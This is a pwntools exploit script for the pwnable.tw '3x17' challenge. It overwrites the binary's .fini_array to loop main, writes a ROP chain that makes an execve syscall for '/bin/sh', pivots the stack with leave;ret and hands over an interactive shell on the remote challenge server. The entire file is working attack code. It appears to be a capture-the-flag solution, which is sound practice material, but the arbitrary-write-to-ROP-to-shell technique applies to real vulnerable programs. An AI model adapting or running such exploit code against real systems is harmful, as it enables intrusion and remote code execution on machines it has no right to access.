#!/usr/bin/env python3
from pwn import *

FINI_ARRAY = 0x4b40f0
MAIN = 0x401b6d
LIBC_CSU_FINI = 0x402960

POP_RAX = 0x41e4af
POP_RDI = 0x401696
POP_RSI = 0x406c30
POP_RDX = 0x446e35
SYSCALL = 0x4022b4
LEAVE_RET = 0x401c4b
STR_ADDR = 0x4b4140

#def write_24(addr, data):
#    p.recvuntil(b'addr:')
#    p.sendline(str(addr).encode())
#    p.recvuntil(b'data:')
#    p.sendline(data)

def write_24(addr, data):
    p.recvuntil(b'addr:')
    p.sendline(str(addr).encode()) 
    p.recvuntil(b'data:')
    p.send(data)

#context.binary = binary = ELF('./3x17')
#p = gdb.debug('./3x17')
#p = process('./3x17')
p = remote('chall.pwnable.tw', 10105)

# 1. Infinite loop
write_24(FINI_ARRAY, p64(LIBC_CSU_FINI) + p64(MAIN) + b'\x00'*8)

# 2. ROP chain writes
write_24(FINI_ARRAY + 0x10, p64(STR_ADDR) + p64(POP_RSI) + p64(0))
write_24(FINI_ARRAY + 0x28, p64(POP_RDX) + p64(0) + p64(POP_RAX))
write_24(FINI_ARRAY + 0x40, p64(0x3b) + p64(SYSCALL) + b'/bin/sh\x00')

# 3. Final pivot (preserve the value at 0x4b4100)
write_24(FINI_ARRAY, p64(LEAVE_RET) + p64(POP_RDI) + p64(STR_ADDR))

p.interactive()
